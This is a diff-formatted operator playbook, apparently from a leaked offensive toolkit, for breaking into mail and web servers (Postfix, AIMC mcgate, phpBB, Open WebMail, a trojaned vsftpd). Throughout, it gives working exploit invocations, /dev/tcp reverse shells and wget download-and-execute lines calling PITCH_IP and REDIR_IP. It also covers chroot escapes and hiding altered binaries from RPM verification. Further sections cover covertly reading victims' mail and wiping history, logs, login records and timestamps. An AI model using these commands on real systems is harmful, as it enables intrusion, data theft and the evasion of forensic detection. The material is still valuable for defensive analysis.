+#                2: SuSE 9.1 RPM (postfix-2.0.19_20040312-11)
+#                3: ASP Linux 9 RPM (postfix-2.0.8-1asp)
+
+# NOTE: THERE ARE OTHERS BEYOND 3....6 is Debian 3.1 for instance....
+
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 1
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 1 -uroot@TARGET_IP
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 2
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 2 -uroot@TARGET_IP
+./enterseed.py 127.0.0.1 2500 PITCH_IP NETCAT_PORT 3 -uroot@TARGET_IP -search1
+ 
+## once the exploit calls back and nopen uploaded connect to noserver
+-nstun TARGET_IP
+
+## check to see if you are chroot'd
+-lt /
+
+## if it looks like 
+#drwx------    2 postfix  root         4096 Apr 27 04:35 2003 corrupt
+#drwx-wx---    2 postfix  postdrop     4096 Apr 27 04:35 2003 maildrop
+#drwx------    2 postfix  root         4096 Apr 27 04:35 2003 saved
+#drwxr-xr-x    3 root     root         4096 Nov 17 07:22 2004 usr
+#drwxr-xr-x   18 root     root         4096 Nov 17 07:22 2004 .
+#drwxr-xr-x    2 root     root         4096 Nov 17 07:22 2004 lib
+#drwx------    2 postfix  root         4096 Nov 17 07:22 2004 hold
+#drwxr-xr-x   26 root     root         4096 Nov 17 07:36 2004 ..
+#drwxr-xr-x    2 root     root         4096 Nov 18 12:54 2004 etc
+#drwx------   18 postfix  root         4096 Nov 18 14:50 2004 active
+#drwx------   18 postfix  root         4096 Nov 18 14:50 2004 bounce
+#drwx------   18 postfix  root         4096 Dec  1 12:37 2004 deferred
+#drwx------    3 postfix  root         4096 Dec  1 14:53 2004 flush
+#drwxr-xr-x    2 root     root         4096 Dec  1 14:53 2004 pid
+#drwx------   15 postfix  root         4096 Dec  8 14:00 2004 defer
+#drwx------    2 postfix  root         4096 Mar  4 15:34 2005 private
+#drwx--x---    2 postfix  postdrop     4096 Mar  4 15:34 2005 public
+#drwxrwxrwx   19 postfix  root         4096 Mar  7 11:36 2005 incoming
+## this means you are in a chrooted environment without any binaries
+## (no ls, netstat, ps, which, w, ...)
+
+## IF NOT CHROOTED, continue to clean logs
+
+## IF CHROOTED 
+-cd incoming
+
+-put /current/up/h h
+-put /current/up/b b
+-put /current/up/s s
+-put /current/up/noserver ncd
+
+## change permissions
+./s h
+./s b
+./s ncd
+./s .
+
+## run break chroot routines
+./h
+
+## you should be able to connect to a new nopen running
+-nstun TARGET_IP 32755
+
+## CLEANUP
+## the location of the chrooted environment was /var/spool/postfix/
+-lt /var/spool/postfix/
+-lt /var/spool/postfix/incoming
+
+-rm b h s ncd a..
+
+## CLEAN LOGS
+## check logs /var/log/mail* /var/adm/mail* /var/log/messages /var/adm/messages
+grep "stripping too many comments" /var/adm/mail*
+grep "stripping too many comments" /var/log/mail*
+grep "signal 11" /var/log/mail*
+grep "signal 11" /var/adm/mail*
+grep "bogus file" /var/adm/mail*
+grep "bogus file" /var/log/mail*
+grep "writable by everyone" /var/adm/mail*
+grep "writable by everyone" /var/log/mail*
+grep PITCH_IP /var/log/messages
+grep PITCH_IP /var/adm/messages
+
+## if any of the directories or files were changed to world writable
+## change them back because postfix will panic
+chmod PREV_PERM /var/spool/postfix/incoming
+
+
+
+
+########################################
+# Exploits a vulnerability in the Postfix mail server.
+# Postfix runs on FreeBSD, Linux, Solaris, and most Unix servers. 
+# This exploit works for the default binary packages in SuSE 9.0-9.2, ASP Linux 9, and Debian 3.1 
+
+# must elevate to get root
+
+      # postfix 2.0.14-41 on SuSE 9.0 
+      # postfix 2.0.19_20040312-11 on SuSE 9.1 
+      # postfix-2.0.8-1asp on ASP Linux 9 
+      # postfix-2.1.5 on SuSE 9.2 
+      # postfix-2.1.5 on Debian 3.1
+# 
+# ENTERSEED expects the DUL Encoder to be in its current directory, as well
+      # as write permission to that directory. 
+# 
+      # In the event of a chroot'ed environment, shared libraries will not be usuable.
+      # Any uploaded files (such as noserver) must be statically compiled.
+# 
+# -tunnel
+# r NETCAT_PORT
+# l RANDOM TARGET_IP TARGET_PORT
+
+
+
+./enterseed.py 127.0.0.1 RANDOM PITCH_IP NETCAT_PORT <platform> [-search<scale>] [-u<valid-username>] [-f<uploaded-filename>] 
+ # Usage: ./enterseed.py <target-ip> <target-port> <callback-ip> <callback-port> <platform> [-search<scale>] [-u<valid-username>] [-f<uploaded-filename>] 
+              # Platforms       1: SuSE 9.0 RPM (postfix-2.0.14-41) from short hostname (0-19 chars)
+                              # 2: SuSE 9.0 RPM (postfix-2.0.14-41) from long hostname (17-43 chars)
+                              # 3: SuSE 9.1 RPM (postfix-2.0.19_20040312-11) from long hostname (17-43 chars)
+                              # 4: ASP Linux 9 RPM (postfix-2.0.8-1asp) from long hostname (17-43 chars)
+                              # 5: SuSE 9.2 RPM (postfix-2.1.5)
+                              # 6: Debian 3.1 (sarge) DEB (postfix-2.1.5)
+# 
+# 
+# Chroot Example: 
+# 
+# Begin like above.  Once connected with noclient, -cd to incoming and upload the statically compiled 
+# EVENTSTART, the breakchroot program, and the setperms program (for this example, these
+# binaries are named h, b, and s, respectively. Since EVENTSTART is unable to take command-line
+# arguments or environment variables, h expects breakchroot to be named "b" and breakchroot 
+# expects noserver to be named "ncd."  The names are all configurable, but require a recompile. 
+# Be sure to compile statically!)
+# 
+# After uploading, use s to set the permissions on b, ncd and the current directory:
+# (remote)$ ./s b
+# (remote)$ ./s ncd
+# (remote)$ ./s .
+# These files should all be set to mode 777 now.
+# 
+# Now run EVENTSTART:
+# (remote)$ ./h
+# EVENTSTART will execute b (the breakchroot program) with root privileges, which will in turn break 
+# out of the chroot and exec ncd (noserver) from the root directory and with root privileges.
+# The breakchroot program creates a directory "a.." while breaking chroot. Remember to delete 
+# this directory as well!
+# Now connect to the new noserver:
+# (local)$ ./noclient TARGET_IP:32755 
+# (remote)# id
+# uid=0(root) gid=0(root) groups=0(root)
+# (remote)# pwd
+# /
+# 
+# Make sure to delete all uploaded files/directories and reset directory permissions!
+# 
+# Troubleshooting:
+# If EVENTSTART fails and says something like "No such file or directory" make sure all binaries 
+# have been statically compiled.
+# If EVENTSTART fails and says something like "Permission denied" make sure all binaries are set
+# to mode 777. If not, use the setperms program (s).
+ 
+
+
+
+#####################################################
+# EMPTYBOWL
+#####################################################
+
+# vulnerability in MailCenter Gateway (mcgate) - an application that comes
+# with Asia Info Message Center mailserver; buffer overflow allows a string
+# passed to popen() call to be controlled by an attacker; arbitraty cmd execute
+# known to work only for AIMC Version 2.9.5.1
+# may get one shot only and then server will crash
+# works on solaris 2.6-2.10
+# test - fire115
+
+# make sure not windows target running 3389 but unix target
+
+-scan mail TARGET_IP
+-scan 3389 TARGET_IP
+
+# Usage: ./emptybowl.py <target-ip> <port> <cmd-string>
+#     --NOTE: All spaces in cmd-string will be replaced by \t's
+
+# on redirector
+
+-tunnel
+l 3389 TARGET_ip
+r LOW_PORT_1
+r LOW_PORT_2
+
+# local may be needed to elevate privileges
+
+# DO NOT use the command below, since only have 1 shot at target
+
+#./emptybowl.py 127.0.0.1 3389 'mkdir /tmp/.scsi ; cd /tmp/.scsi && telnet PITCH_IP NETCAT_PORT < /dev/console | uudecode && uncompress sendmail.Z && chmod 700 sendmail && PATH=. D=-cPITCH_IP:NOPEN_PORT sendmail;'
+
+
+(sh</dev/tcp/PITCH_IP/RANDOM_HIGH_PORT1>&0 2>&0)
+
+##### use this one
+nc -l -vv -p 33333
+./emptybowl.py TARGET_IP 3389 "/usr/bin/ksh -c \"sh</dev/tcp/PITCH_IP/33333 >&0 2>&0\""
+
+##### or this with doublet:
+./emptybowl.py TARGET_IP 3389 "/usr/bin/ksh -c \"cat < /dev/tcp/PITCH_IP/33333 | /bin/sh 2>&1 | cat > /dev/tcp/PITCH_IP/44444 2>& 1\""
+
+# on redirector
+netstat -an | grep LISTEN
+
+# look for low ports to use for doublet that are not
+# being used on the redirector (21,22,22,53,79,80,443...)
+
+# substitute LOW_PORT_1, LOW_PORT_2 with ports decided
+# from the above netstat command
+
+doublet -O LOW_PORT_1 LOW_PORT_2
+
+# change LOW_PORT_1, LOW_PORT_2, and PITCH_IP
+
+./emptybowl.py 127.0.0.1 3389 "/bin/ksh -c \"cat < /dev/tcp/PITCH_IP/LOW_PORT_1 | /bin/sh 2>&1 | cat > /dev/tcp/PITCH_IP/LOW_PORT_2 2>& 1\""
+
+#./emptybowl.py 127.0.0.1 3389 '(telnet PITCH_IP LOW_PORT_1 ; sleep 1) | /bin/sh | telnet PITCH_IP LOW_PORT_2'
+
+# in doublet window
+unset HISTSIZE
+unset HISTFILESIZE
+unset HISTFILE
+w
+pwd
+id
+cd /tmp
+mkdir .scsi
+cd .scsi
+
+# locally
+packrat RAND_PORT
+<ctrl><c>      # packrat command
+gedit sendmail.Z.uu
+
+# in doublet
+pwd             # make sure in /tmp/.scsi
+/usr/bin/uudecode; ls -latr
+copy/paste gedit contents into this window
+uncompress sendmail.Z
+ls -l
+chmod 700 sendmail
+PATH=. sendmail
+
+# from redirector
+-nstun TARGET_IP
+
+# restart mcgate 
+
+ <ctrl><d> doublet window on TARGET_IP
+<ctrl><d>
+
+# close tunnels on PITCH_IP
+
+# start a new NOPEN with 'at' to avoid inheritance of listening socket
+-cd /tmp/.scsi
+echo "./sendmail" | at now
+# from PITCH_IP
+-nstun TARGET_IP:32755
+
+#burn this NOPEN to free up socket; from original NOPEN
+# started (32754) on TARGET_IP
+-burnBURN
+
+# NOPEN 2:
+# now restart mcgate in new NOPEN - use at again to prevent mcgate 
+#  from being terminated on exit.
+
+-cd /opt/aimc/setup
+echo "./mcgate" | at now
+-cd /tmp/.scsi
+ps -ef | grep mcgate
+
+# ELEVATE with extremeparr (dtappgather)
+
+# after ELEVATE with extremeparr (dtappgather)
+# and restarting noserver (sendmail), connect with
+
+-nstun TARGET_IP:32754
+-rm sendmail
+# burn nopen window on TARGET_IP with id of aimc
+id
+-burnBURN
+
+#
+# cleanup
+
+-lt /opt/aimc/setup/
+
+# remove core file
+
+-rm /opt/aimc/setup/core
+
+# in mcgate's directory; the following will be appended to mcgate.<date>:
+Fri Feb 11 16:36:49 2005: cmdopen
+   --- : 0 : current cmd: uapi -u  -f userPassword -e ********************************************
+Fri Feb 11 16:36:49 2005: cmdopen
+   --- : 0 : Result:  rc= -5 len=0
+
+-get /opt/aimc/setup/mcgate.YYYYMMDD
+
+#locally
+cp /current/down/../HOSTNAME.IP/opt/aimc/setup/mcgate.YYYYMMDD /current/up/m
+
+# remove above entries; please leave the mcgate
+# start values even the one we started. For example, leave:
+
+Fri Apr  8 16:12:28 2005: main
+   --- : 0 :  Current server port is 3389
+
+vi /current/up/m
+
+# on target
+-put /current/up/m m
+-ls -n /opt/aimc/setup/mcgate.YYYYMMDD
+cat m > /opt/aimc/setup/mcgate.YYYYMMDD
+-tail /opt/aimc/setup/mcgate.YYYYMMDD
+# use -touch -t command from -ls -n output to
+# reset timestamp on /opt/aimc/setup/mcgate.YYYYMMDD and
+# /opt/aimc/setup.  For example:
+-touch -t 1112992709:1112992787    /opt/aimc/setup/mcgate.YYYYMMDD
+-touch -t 1112992709:1112992787    /opt/aimc/setup
+
+-rm m
+
+at -l
+-lt /var/spool/cron /var/spool/cron/atjobs
+-touch /var/spool/cron/crontabs /var/spool/cron/atjobs
+
+-cd ..
+-rm .scsi
+
+###### PORKED VSFTP Server  #################################
+
+# check to see if can use DIZZYTACHOMETER to remove mismatched vsftpd
+
+rpm --version
+
+whereis vsftpd
+
+rpm -qf /usr/sbin/vsftpd
+
+rpm -V vsftpd-1.1.3-8
+
+-lt /usr/lib/librpm-4.1.so /usr/lib/librpmdb-4.1.so /usr/lib/librpmio-4.1.so /usr/lib/libpopt.so /usr/lib/libbeecrypt.so /usr/lib/libbz
+2.so
+
+# or
+-lt /usr/lib/librpm-4.2.so /usr/lib/librpmdb-4.2.so /usr/lib/librpmio-4.2.so /usr/lib/libpopt.so /usr/lib/libbeecrypt.so /usr/lib/libbz
+2.so
+
+-lt /usr/sbin/vsftpd
+# normal vsftpd md5sum: 11111ecd2d3ab44015eae3592fcfaec7
+# porked vsftpd md5sum: bde8b06829df05be8be4b5972a2d4a39
+md5sum vsftpd
+
+-put /current/up/it it
+./it /usr/sbin/vsftpd
+
+cp /usr/sbin/vsftpd ?
+-put /current/up/vsftpd vsftpd
+cp vsftpd /usr/sbin/vsftpd
+# use itime results to reset vsftpd times to original settings
+./it /usr/sbin/vsftpd
+
+service vsftpd stop
+service vsftpd start
+
+########  Trigger porked vsftpd
+
+### in local window, get nopen ready
+packrat -z NETCAT_PORT
+
+### on redirector, get nopen listener ready
+-nrtun NOPEN_PORT
+
+
+### on redirector, set up tunnel, use a "pork source port" from list below
+-tunnel
+l 21 TARGET_IP 21 SPORT
+r NETCAT_PORT
+
+### in scripted local window, send pork trigger
+
+#Usage: ./client -t|-u timeadj sport hostname dport command
+#sport: 3 51 3854 5671 8213 12634 16798 23247 35139 47923 53246 63201
+
+#./client -t|-u [tcp/udp] timeadj sport [(valid source ports for the server are: 3, 51, 3854, 5671, 8213, 12634, 16798, 23247, 35139, 47923, 53246, 63201)]  hostname[Host IP]  dport [(port on which PORKified daemon is listening)] command"
+
+./client -t 0 SPORT 127.0.0.1 21 "cd /tmp;mkdir -p .scsi && cd .scsi; cat < /dev/tcp/PITCH_IP/NETCAT_PORT > sendmail.uu && uudecode sendmail.uu && chmod 755 sendmail && PATH=. S=1 D=-cPITCH_IP:NOPEN_PORT ./sendmail"
+
+
+
+# use DIZZYTACHOMETER to hide package mismatches
+
+##############  DIZZYTACHOMETER #################
+# Most Linux distributions contain a RPM database which stores information on installed files.  Thus, if a system file is
+# modified, the rpm "Verify" command easily alert the sysadmin of the changed file. DIZZYTACHOMETER alters a computer's
+# RPM (4.1 or higher) database in order to hide a modified file.  This is essential when dropping down implants such
+# as Jackladder and Pork.
+
+# Works on Redhat 8 (rpm version 4.1), Redhat 9 (rpm version 4.2), and Mandrake
+9.2 (verison 4.2)
+rpm --version
+
+./DizzyTach -p "packageName" [-f "filepath\file"] [-d] [-r] [-c] [-s] [-m] [-t]
+[-q] [-V]
+
+        or
+
+ARGS="-p "packageName" [-f "filepath\file"] [-d] [-r] [-c] [-s] [-m] [-t] [-q] [-V] [-R]" ./DizzyTach
+
+# library dependencies in /usr/lib:
+#
+# librpm-4.1.so
+# librpmdb-4.1.so
+# librpmio-4.1.so
+# libpopt.so
+# libbeecrypt.so
+# libbz2.so
+
+-lt /usr/lib/librpm-4.1.so /usr/lib/librpmdb-4.1.so /usr/lib/librpmio-4.1.so /usr/lib/libpopt.so /usr/lib/libbeecrypt.so /usr/lib/libbz
+2.so
+
+# or
+
+-lt /usr/lib/librpm-4.2.so /usr/lib/librpmdb-4.2.so /usr/lib/librpmio-4.2.so /usr/lib/libpopt.so /usr/lib/libbeecrypt.so /usr/lib/libbz
+2.so
+
+example:
+
+# Suppose we want to hide /usr/sbin/vsftpd frpm RPM
+
+$ whereis vsftpd
+vsftpd: /usr/sbin/vsftpd
+
+# Find the rpm package that is responsible for this file.
+$ rpm -qf /usr/sbin/vsftpd
+vsftpd-1.1.3-8
+
+
+# Run the rpm "Verify" command on the vsftpd-1.1.3-8 package.
+rpm -V vsftpd-1.1.3-8
+S.5....T  /usr/sbin/vsftpd
+
+# S, 5, and T were output.  This means the vsftpd binary has a different size, md5, and modification time than the
+# rpm database.
+
+-put /current/up/DIZZYTACHSTATIC rpmStatic
+# final command would be:
+$ ./rpmStatic -p vsftpd-1.1.3-8 -f /usr/sbin/vsftpd -s -m -t -d -r -c
+    Reset:          OK
+    SigRepair:      NO
+    Lookup          OK      Sig Exists
+    Reset:          OK
+    -d:             OK
+    -m:             UPDATED
+    -s:             UPDATED
+    -t:             UPDATED
+    Commit:         OK      Tested write of 8392 bytes
+                            Performed write of 8392 bytes
+    Reset:          OK
+    -r:             OK
+    Commit:         OK      Tested write of 8392 bytes
+                            Performed write of 8392 bytes
+    Reset:          OK
+
+
+# Check to see if the "vsftpd" is now hidden from rpm
+$ rpm -V vsftpd-1.1.3-8
+
+# This time, /usr/sbin/vsftpd is not output.  Our modified file is now hidden from RPM!
+-rm rpmStatic
+
+############################  ESMARKCONANT ##################################
+# Exploits a vulnerability in the phpBB forum software.
+# No authentication is required.
+
+# target to be running phpBB less than version 2.0.11
+
+# usage: ./xp_phpbb.pl -i<url> -t<valid topic_number> -c<commands to run
+# on target>
+
+# -i <http://127.0.0.1:80/forum/>
+# -t <viewtopic.php?t=[topic_number]>
+# -c <Command to run on target>
+
+#./xp_phpbb.pl -i http://127.0.0.1:80/forum/ -t1 -c"uname -a;ls -la;w"
+
+#./xp_phpbb.pl -i http://127.0.0.1:80/forum/ -t1 -c"(mkdir /tmp/.scsi; cd /tmp/.scsi; /usr/bin/wget http://10.1.2.150:5555/sendmail -O
+sendmail;chmod +x sendmail;D=-c10.1.2.150:9999 PATH=. sendmail) 2>/dev/null"
+
+
+
+
+# 2 step troubleshooting
+-tunnel
+l 80 TARGET_IP
+r NETCAT_PORT
+
+nc 127.0.0.1 80
+telnet 127.0.0.1 80
+GET /phpBB2/ HTTP/1.0
+
+# response should be:
+# Powered by phpBB 2.0.4
+
+# determine if viewtopic.php is vulnerable
+./xp_phpbb.pl -i http://127.0.0.1:80/forum/ -t1 -c"uname -a;ls -la;w"
+
+# response should have the output of the commands in the request:
+# ...
+#       <br/>
+
+cd /current/up
+#locally to setup fowget to put rat on target since no uudecode
+echo -e "HTTP/1.0 200\n" > new
+cat new noserver > sendmail
+nc -v -l -p NETCAT_PORT < sendmail
+
+# on PITCH
+-nrtun RAND_PORT
+
+# upload and execute nopen
+./xp_phpbb.pl -i http://127.0.0.1:80/forum/ -t1 -c"(mkdir /tmp/.scsi; cd /tmp/.scsi; /usr/bin/wget http://PITCH_IP:NETCAT_PORT/sendmail
+ -Osendmail;chmod +x sendmail;D=-cPITCH_IP:RAND_PORT PATH=. sendmail) 2>/dev/null"
+
+# clean web access log
+#########  SNMPWALK
+-tunnel
+u 161 TARGET_IP
+
+snmpwalk 127.0.0.1 -c COMMUNITY_STRING .system
+#snmpwalk -v1 -c Ult1mate 127.0.0.1 .system
+#snmpwalk -v2c -c Ult1mate 127.0.0.1 .system
+#snmpwalk -v1 -c tenkap 127.0.0.1 enterprises.9.9.23.1
+
+#####################################################
+# EVOKEPROMPT
+#####################################################
+
+# In netscape/mozilla to get magic cookie:
+# Tools->Cookie Manager->Manage Stored Cookies
+# click on your cookie; take note of name and Information
+# change name-sessionid and OWVSdif1.AMY to name and Information
+# for the following command
+# change callback IP
+
+in /etc/hosts, add the dns target name to 127.0.0.1
+
+
+1.EVOKEPROMPT Software Description:
+
+      - Exploits a vulnerability in a CGI against the Open WebMail system.  The request is parsed by the openwebmail-folder.pl CGI and is transferred to a perl open call which allows
+      arbitrary command execution. Open WebMail runs on FreeBSD, Linux, Solaris, and most Unix servers.
+
+      - The Open WebMail system runs as "nobody", therefore a local exploit is needed if root access is required.
+
+      - Since it's a logic error, the same exploit will work on all versions of Unix.            
+
+    2.EVOKEPROMPT Usage:  
+
+      # ./xp_downloadfolder
+      usage: ./xp_downloadfolder -i<host> -u<user> -a<user-sessionid> -b<session number> -p<port> -c<commands to run on target>
+
+        -i <hostname|IP>
+        -p <default Port = 80>
+        -c <command to run on target>
+        -u <user>
+        -a <user-sessionid which appears in the cookie>
+        -b <session number which appears in the URL>
+
+      Examples:
+      1) ./xp_downloadfolder -i127.0.0.1 -ufuzz -a"OWNkEmsJpDdMg" -b0.0195130566871775 -c"mkdir /tmp/.scsi; cd /tmp/.scsi; cat</dev/tcp/PITCH_IP/4444>sendmail;chmod +x
+      sendmail;sleep 60;PATH=. D=-cPITCH_IP:5555 sendmail"
+
+      2) ./xp_downloadfolder -i127.0.0.1 -ufuzz -a"OWNkEmsJpDdMg" -b0.0195130566871775 -c"PATH=/usr/bin w"
+
+      3) ./xp_downloadfolder -i127.0.0.1 -ufuzz -a"OWNkEmsJpDdMg" -b0.0195130566871775 -c"sh</dev/tcp/PITCH_IP/4444>&0 2>&0"
+
+    3.Target Susceptablility: 
+
+      EVOKEPROMPT requires the target to be running Open WebMail 2.10 or higher.
+
+    4.On what will EVOKEPROMPT fail? 
+      Will not work on older versions of Open WebMail. Versions that will not work include Open WebMail 1.80, 1.90, 2.00.
+        
+    5.EVOKEPROMPT Additional Requirements: 
+      Need username/password to authenticate.
+      Local exploit based upon the operating system. Could use DTAPPGATHER for Solaris, rfork for FreeBSD, or ptrace for Linux.
+        
+    6.Give troubleshooting instructions: 
+      There are the steps in troubleshooting EVOKEPROMPT:
+      1. Determine if the webserver is running Open WebMail 2.10 or higher:
+          # galeon http://targetip/
+
+      2. Determine the OS based upon "User Preference/About" in the Open WebMail system.
+
+    7.EVOKEPROMPT Example Usage:
+
+1) <Open up a browser to the target address>
+            # galeon http://127.0.0.1/
+
+            2) Enter the UserID and Password. For the rest of this example, UserID is name.
+
+            3) Set up Nopen to listen for a connection. 
+                # noclient -l 123
+                or
+                # -nrtun 123
+
+            4) View the cookie for "Site" (in this case, 127.0.0.1) and "Cookie Name" (in this case, name-
+sessionid). The value
+                  should be similar to this: OWVSdiyf1.AMY
+
+            5) Also, need to use the session ID in the URL, for example: sessionid=name*-session-0.2724838
+93045322
+
+            6) Send the exploit using xp_downdloadfolder with the above information:
+
+                # ./xp_downloadfolder -i127.0.0.1 -uname -a"OWNkEmsJpDdMg" -b0.0195130566871775 -c"mkdir / tmp/.scsi; cd /tmp/.scsi; cat</dev/tcp/PITCH_IP/123>sendmail;chmod +x sendmail;sleep 60;PATH=. D=-cPITCH_IP:123 sendmail"
+
+
+# this worked on faintspirit
+./xp_downloadfolder -i127.0.0.1 -utonggl -a"OWKyenMN8jyV2" -b0.125111049580486 -c"/usr/bin/wget http://REDIR_IP:443"
+
+# others
+./xp_downloadfolder -i127.0.0.1 -utonggl -a"OWXIer7nk2%2FpM" -b0.535692078600736 -c"(sh</dev/tcp/REDIR_IP/40151>&0 2>&0)"
+./xp_downloadfolder -i127.0.0.1 -utonggl -a"OWKyenMN8jyV2" -b0.125111049580486 -c"sh</dev/tcp/REDIR_IP/40151>&0 2>&0"
+./xp_downloadfolder -i127.0.0.1 -utonggl -a"OWKyenMN8jyV2" -b0.125111049580486 -c"/usr/bin/w; /bin/date"
+./xp_downloadfolder -i127.0.0.1 -utonggl -a"OWKyenMN8jyV2" -b0.125111049580486 -c"/usr/bin/wget http://REDIR_IP:443"
+./xp_downloadfolder -i127.0.0.1 -utonggl -a"OWKyenMN8jyV2" -b0.125111049580486 -c"/usr/bin/wget http://REDIR_IP:443"
+./xp_downloadfolder -i127.0.0.1 -utonggl -a"OWKyenMN8jyV2" -b0.125111049580486 -c"mkdir /tmp/.scsi; cd /tmp/.scsi; /usr/bin/wget http://REDIR_IP:443/sendmail; chmod 700 sendmail; PATH=. D=-cREDIR_IP:46776 sendmail"
+
+# abort the curl command, then modify the string to have the "ow-sessionkey-mail.ihep.ac.cn-", https://127.0.0.1:443, and "=tonggl*mail.ihep.ac.cn-session-" info included
+
+# wget nopen (this worked):
+curl --cookie "ow-sessionkey-mail.ihep.ac.cn-tonggl=OWKyenMN8jyV2" "https://127.0.0.1:443/cgi-bin/openwebmail/openwebmail-folder.pl?sessionid=tonggl*mail.ihep.ac.cn-session-0.125111049580486&amp;folder=|(echo%20%27mkdir%20FtmpFEscsi%3B%20cd%20FtmpFEscsi%3B%20FusrFbinFwget%20http%3AFF2G3E234E72E4%3A443Fsendmail%3B%20chmod%207GG%20sendmail%3B%20PATH%3DE%20D%3D-c2G3E234E72E4%3A46776%20sendmail%27%7CPATH%3D%60printf%20%27%5C057usr%5C057bin%27%60%20tr%20E-G%20.-0%7CPATH%3D%60printf%20%27%5C057bin%27%60%20sh)&amp;action=downloadfolder"
+
+
+
+### In a local scripted window, set up a netcat to listen for a connection:
+
+nc -vv -l -p NETCAT_PORT
+
+
+### try connecting via netcat after any "session failed" message when redirecting:
+unset HISTSIZE
+unset HISTFILESIZE
+unset HISTFILE
+w
+uname -a
+### start a netcat with the right nopen version (don't need to uuencode with /dev/tcp way)
+###  nc -l -p NETCAT_PORT < sendmail
+pwd
+mkdir /tmp/.scsi; cd /tmp/.scsi; pwd
+ls -l /usr/bin/uudecode
+/bin/cat</dev/tcp/REDIR_IP/39588>/tmp/.scsi/sendmail
+chmod 700 sendmail
+PATH=. sendmail
+id
+
+
+grep -v "PITCH_IP" /home/ihep/tonggl/.openwebmail
+-gs grepout -d -w /tmp/.scsi "PITCH_IP" /home/ihep/tonggl/.openwebmail/history.log
+-gs grepout -d -w /tmp/.scsi "PITCH_IP" /home/ihep/chep2001/.openwebmail/history.log
+
+-gs grepout -d -w /tmp/.scsi "PITCH_IP" /var/log/openwebmail.log
+
+grep -v "PITCH_IP" /var/log/openwebmail.log> o; cat o > /var/log/openwebmail.log
+
+
+
+
+
+
+            7) Check the following logs and directories:
+  
+                /home/name/.openwebmail/history.log
+                /var/log/httpd/access_log
+                /var/log/openwebmail.log
+                /home/name/mail
+                /home/name
+                /var/www/cgi-bin/openwebmail/etc/sessions/
+
+
+
+#####################################################
+# POPPING MAIL FROM A TARGET
+#####################################################
+
+### You'll be listing the messages from within a scripted window
+### You'll need to devise a way to separate the mail for multiple users (for tuckering)
+###     if you are accessing more than one account
+###     You might try using a separate scripted window for each user, then copying
+###     the scripted window to the name of the user for post-processing
+### The session timeout is fairly short so have your commands ready to paste
+### You have to "guess" where the newest mail is, so you might want to start
+###     backwards to get the most recent mail, IF that applies and the mail is
+###     sorted by date
+
+###   IMPORTANT!!!!!!  DO NOT "QUIT" THE SESSION!!!!  LET IT TIMEOUT,
+###     OR CLOSE THE TUNNEL TO HAVE IT DROP THE CONNECTION.
+### You do not want the mail marked as "read" or anything else.
+
+### set up tunnels on redirector:
+
+-tunnel
+l 110 TARGET_IP
+
+
+
+### in a local scripted window:
+
+telnet 127.0.0.1 110
+USER <USERNAME>
+PASS <PASSWD>
+LIST
+RETR 1
+RETR 2
+RETR 3
+RETR 4
+RETR 5
+
+RETR 6
+RETR 7
+RETR 8
+RETR 9
+RETR 10
+...
+...
+...
+
+### If the session hasn't timed out, close the tunnel channel to move on to the 
+###     next user or to end the op
+
+
+
+#############################################################################
+
+############ I AM ROOT!
+
+#############################################################################
+
+###path with NO Working directory for atjob
+#-setenv PATH=:/usr/bsd:/bin:/usr/bin:/sbin:/usr/sbin:/etc:/usr/etc
+-setenv PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
+
+HISTFILE="" ksh
+
+	# or
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+
+-ls
+
+-rm sendmail sendmail.uu
+
+# Look for and clean (if necessary) logs 
+
+######  FORENSICS ##############
+
+=info
+
+df -k
+-find <directory1> <directory2>
+
+-gs survey
+-ls /var/spool/cron/crontab
+-strings /platform
+	##  /platform/SUNW,SystemEngine
+
+
+### See who's on, note uptime and load; verify time/timezone; see who's been on
+w; date; last -80
+
+### Change owner/group/modes...if in doubt, see what's already in "/tmp"...
+-ls -t / /tmp
+
+### core files?
+-ls /core
+
+### Root users:
+-ls /var/adm/sulog
+-vget /var/adm/sulog
+
+### owner:group should be root:sys...
+chown -R root:sys /tmp/.scsi; chmod -R og-rwx /tmp/.scsi; ls -al
+
+### Baseline swap
+/sbin/ps -elf; swap -l; uptime
+
+### Enough space to upload tools?  Any partitions about to fill up?
+df -k
+
+
+################  OTHER CLEANING ################
+
+#################################
+### TOAST the login entries.....
+#################################
+
+### Target window
+-put ../up/toast t
+
+### TO VIEW...
+./t -u /var/adm/utmp 
+./t -u /var/adm/wtmp | tail -20
+./t -x /var/adm/utmpx 
+./t -x /var/adm/wtmpx | tail -20
+./t -l /var/adm/lastlog | tail
+
+### TO ZAP...
+./t -u /var/adm/utmp tty date
+./t -u /var/adm/wtmp tty date
+./t -x /var/adm/utmpx tty date
+./t -x /var/adm/wtmpx tty date
+./t -l /var/adm/lastlog /var/adm/wtmp[x] user
+
+
+#################################
+### SGREP messages
+#################################
+-put ../up/sgrep s
+
+-tail /var/adm/messages
+
+### To look first:
+./s "unique string" /var/adm/messages
+
+### To replace with a string of equal or shorter length
+./s "unique string" "replacement string" /var/adm/messages
+
+#################################
+### SGREPSUB  (numerous things to grep)
+#################################
+
+
+usage: sgrepsub -i /tmp/messages -r /tmp/rand -c 31 
+  -i <infile: lines to be replaced by sgrep>
+  -r <replacement file: substitution lines>
+  -c <column to start replacing: use vi <ctl g> to find the column number>
+  -h <help>
+  -f <filename string: default = /var/log/messages>
+  -s <sgrep alias: default = ./s>
+ex: sgrepsub -i /tmp/messages -r /tmp/rand -c 31 -f /var/log/messages
+
+
+### Locally, create a file containing the lines you want to change from /var/adm/messages
+
+cd /current/down
+vi sg.input
+
+### Locally, create a 2nd file containing one or more lines of replacement strings
+cd /current/down
+vi sg.repl
+
+### Locally, run
+sgrepsub -i sg.input -r sg.repl -c <COL_NUM> -f /var/adm/messages -s ./s
+
+### Verify the output, then paste the generated commands in the target window
+
+#################################
+### PCLEAN (put up right one)
+#################################
+
+-put ../up/pcleanTAB sendmail
+
+-ls
+
+### make sure to exit all but one window (processes log upon completion)
+
+
+### Pclean usage:
+###	-e: look for null entries
+###	-i: calc number of entries in file
+###     -r: looks for entries with gid=root
+###     -t: search this time range
+###     -l: search for last X hours
+###     -S: ignore matches in the following string?
+
+### Usage:
+./pclean [-h(elp)] [-d] [selection_option(s)] [filename]
+   -d:          DELETE selected entries 
+
+
+Selection options: (Two or more selection options are ANDed together)
+--------------------------------------------------------------------
